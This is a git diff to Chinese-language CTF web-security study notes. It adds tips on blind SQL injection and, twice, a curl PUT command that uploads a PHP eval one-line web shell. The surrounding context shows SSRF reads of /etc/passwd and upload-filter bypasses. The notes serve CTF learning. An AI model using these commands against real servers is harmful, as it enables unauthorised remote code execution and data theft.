@@ -412,6 +412,7 @@ SELECT * FROM users WHERE username='vampire     ';
 #### SQL 盲注示例代码
 
 - 可以使用示例代码的 SQL 注入语句来测试
+- 盲注的意义是猜对当前 SQL 执行表中的某个字段的值（如表中有用户密码、flag 等信息）。如果该表已经透明，flag 肯定不在该表中，可能使用 sqlmap 解法可以获取到 flag
 
 ##### 猜密码
 
@@ -541,11 +542,12 @@ while True:
 - index.php 的默认路径是 /var/www/html/index.php
 - 看到类似 ?id=1 的 url，无论是不是一个正常页面，可以联想到注入（尤其可以联想到伪协议）
 - 网页上显示的未必是真实源码，如果题目过滤了网页中代码没显示的字符，应该联想到网页中代码不真实。寻找真实源码或其他突破口
-- 即便是 PHP 的题，也要有看源码和 HTTP headers 的习惯
+- 即便是代码审计的题，也要有看源码和 HTTP headers 的习惯
 - php 正则表达式后加一个 /i 表示大小写不敏感匹配
 - include('index.php') 后的文件未必会显示在前端，只有 echo 后才会显示到前端
 - 使用 include 包含文件时，如果不显示文件内容，记得使用伪协议
 - 看到 PHP 返回内容是 HTTP Headers，可以联想到 %00截断
+- 如果服务器开放了 HTTP PUT 方法，可以使用  `curl -X PUT -d '<?php eval(@$_POST['a']); ?>' http://x/b.php` 注入 `b.php` 文件
 - 培养目录提权思维，如果一道题本身禁止访问 /flag.php，可以通过参数构造地址的方法 (类似 127.0.0.1/flag.php) 来访问。curl_setopt() 函数就类似 Python 的 requests，可以访问外部或内部地址
 - SSRF
   - 常用套路 file:///etc/password ; file:///flag
@@ -589,6 +591,7 @@ while True:
 ###### test.php
 
 - 有的题需要修改 Content-Type 为 image/jpg 绕过，如果不行，则改成 **image/jpeg**
+- 如果服务器开放了 PUT 方法，还可以使用  `curl -X PUT -d '<?php eval(@$_POST['a']); ?>' http://x/b.php` 注入 `b.php` 文件
 
 1.编辑 PHP 文件内容:
 
